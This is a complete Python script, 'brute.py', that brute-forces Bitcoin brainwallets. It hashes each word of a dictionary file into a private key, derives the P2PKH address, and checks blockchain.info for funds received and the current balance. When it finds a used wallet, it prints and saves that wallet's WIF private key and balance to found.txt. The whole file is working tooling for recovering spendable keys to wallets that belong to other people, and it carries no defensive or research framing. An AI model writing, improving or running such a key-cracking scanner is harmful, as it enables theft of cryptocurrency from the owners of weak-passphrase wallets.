#!/usr/bin/env python3
# brute.py
# iSH-friendly bruteforce scanner (p2pkh only)

from __future__ import annotations
import io, sys, logging, time, binascii, hashlib, requests, random, os
import ecdsa, base58

# ------------------ Wallet (P2PKH only) ------------------
class Wallet:
    """
    Wallet(passphrase, is_private_key=False)
    Only generates p2pkh address starting with '1'.
    """
    def __init__(self, passphrase, is_private_key=False):
        self.passphrase = passphrase
        self.is_private_key = bool(is_private_key)
        if self.is_private_key:
            if self._looks_like_hex(self.passphrase):
                self.private_key = self.passphrase.lower()
            else:
                self.private_key = self._wif_to_hex(self.passphrase)
        else:
            self.private_key = binascii.hexlify(hashlib.sha256(self.passphrase.encode('utf-8')).digest()).decode()
        self.wif = self._hex_to_wif(self.private_key)
        self.pubkey_compressed = self._priv_to_compressed_pubkey(self.private_key)
        self.address = self._p2pkh_from_pubkey(self.pubkey_compressed)

    def _looks_like_hex(self, s):
        try:
            int(s, 16)
            return len(s) in (64, 66)
        except Exception:
            return False

    def _hex_to_wif(self, priv_hex, compressed=True):
        b = binascii.unhexlify(priv_hex)
        payload = b'\x80' + b
        if compressed:
            payload += b'\x01'
        checksum = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
        return base58.b58encode(payload + checksum).decode()

    def _wif_to_hex(self, wif):
        try:
            raw = base58.b58decode(wif)
            payload = raw[:-4]
            if len(payload) == 34 and payload[-1] == 0x01:
                key = payload[1:-1]
            else:
                key = payload[1:]
            return binascii.hexlify(key).decode()
        except Exception:
            return ""

    def _priv_to_compressed_pubkey(self, priv_hex):
        priv = binascii.unhexlify(priv_hex)
        sk = ecdsa.SigningKey.from_string(priv, curve=ecdsa.SECP256k1)
        vk = sk.get_verifying_key()
        px = vk.to_string()
        x = px[:32]; y = px[32:]
        prefix = b'\x02' if (y[-1] % 2 == 0) else b'\x03'
        return prefix + x

    def _hash160(self, data_bytes):
        return hashlib.new('ripemd160', hashlib.sha256(data_bytes).digest()).digest()

    def _p2pkh_from_pubkey(self, pubkey_bytes):
        rip = self._hash160(pubkey_bytes)
        pref = b'\x00' + rip
        checksum = hashlib.sha256(hashlib.sha256(pref).digest()).digest()[:4]
        return base58.b58encode(pref + checksum).decode()

# ------------------ BaseBlockExplorer ------------------
class BaseBlockExplorer:
    def __init__(self):
        self.session = None
        self._base_url_received = None
        self._base_url_balance = None

    def open_session(self):
        logging.info("Opening new session")
        self.session = requests.Session()

    def close_session(self):
        logging.debug("Closing session")
        if self.session:
            try: self.session.close()
            except Exception: pass
        self.session = None

    def _get(self, url, timeout=15):
        r = self.session.get(url, timeout=timeout)
        r.raise_for_status()
        return r

    def _parse_numeric_from_response(self, response):
        text = response.text.strip()
        try: return float(text)
        except: pass
        try:
            j = response.json()
            for key in ("total_received","totalReceived","final_balance","finalBalance","balance","received"):
                if isinstance(j, dict) and key in j:
                    return float(j[key])
        except: pass
        raise Exception("Unable to parse numeric from response: "+text[:200])

    def get_received(self, addr):
        r = self._get(f"{self._base_url_received}/{addr}")
        return self._parse_numeric_from_response(r)

    def get_balance(self, addr):
        r = self._get(f"{self._base_url_balance}/{addr}")
        return self._parse_numeric_from_response(r)

# ------------------ Concrete Explorer ------------------
class BlockchainInfo(BaseBlockExplorer):
    def __init__(self):
        super().__init__()
        self._api_limit_seconds = 1
        logging.info("Sleeping %s seconds before blockchain.info calls", self._api_limit_seconds)
        self._base_url_received = "https://blockchain.info/q/getreceivedbyaddress"
        self._base_url_balance = "https://blockchain.info/q/addressbalance"

    def get_received(self, addr):
        time.sleep(self._api_limit_seconds)
        val = super().get_received(addr)
        return val / 1e8 if val>100000 else val  # satoshi->BTC

    def get_balance(self, addr):
        time.sleep(self._api_limit_seconds)
        val = super().get_balance(addr)
        return val / 1e8 if val>100000 else val

# ------------------ Main ------------------
def main():
    logging.basicConfig(level=logging.INFO, format='%(message)s')
    explorer = BlockchainInfo()
    explorer.open_session()

    dict_file = "dictionary.txt"
    output_file = "found.txt"

    try:
        f_dictionary = io.open(dict_file, 'rt', encoding='utf-8')
    except Exception as e:
        logging.error("Cannot open dictionary.txt: %s", e)
        sys.exit(1)

    try:
        fout = open(output_file,'w',encoding='utf-8')
    except Exception as e:
        logging.error("Cannot open found.txt: %s", e)
        sys.exit(1)

    for raw in f_dictionary:
        word = raw.strip()
        if not word: continue
        try:
            wallet = Wallet(word)
        except Exception as e:
            logging.warning("Failed to create wallet '%s': %s", word, e)
            continue

        addr = wallet.address
        retry, max_retries, backoff = 0, 4, 1.0
        received = 0
        while retry<max_retries:
            try:
                received_raw = explorer.get_received(addr)
                received = float(received_raw)
                break
            except Exception as e:
                retry += 1
                sleep = backoff*(2**(retry-1))*(0.5+random.random())
                logging.warning("Error fetching received for %s: %s — retry %d/%d sleeping %.2fs", addr, e, retry,max_retries,sleep)
                time.sleep(sleep)
        if retry==max_retries: continue
        if received==0: continue

        balance = 0
        retry=0
        while retry<max_retries:
            try:
                balance_raw = explorer.get_balance(addr)
                balance = float(balance_raw)
                break
            except Exception as e:
                retry += 1
                sleep = backoff*(2**(retry-1))*(0.5+random.random())
                logging.warning("Error fetching balance for %s: %s — retry %d/%d sleeping %.2fs", addr,e,retry,max_retries,sleep)
                time.sleep(sleep)
        if retry==max_retries: continue

        # LOUD OUTPUT
        print("\n=== USED WALLET FOUND ===")
        print(f"WORD: {word}")
        print(f"ADDRESS (p2pkh): {addr}")
        print(f"WIF: {wallet.wif}")
        print(f"RECEIVED BTC: {received}")
        print(f"CURRENT BALANCE BTC: {balance}")
        print("========================\n")
        fout.write(f"{word},{addr},{wallet.wif},{received},{balance}\n")
        fout.flush()

    explorer.close_session()
    f_dictionary.close()
    fout.close()
    logging.info("DONE.")

if __name__=="__main__":
    main()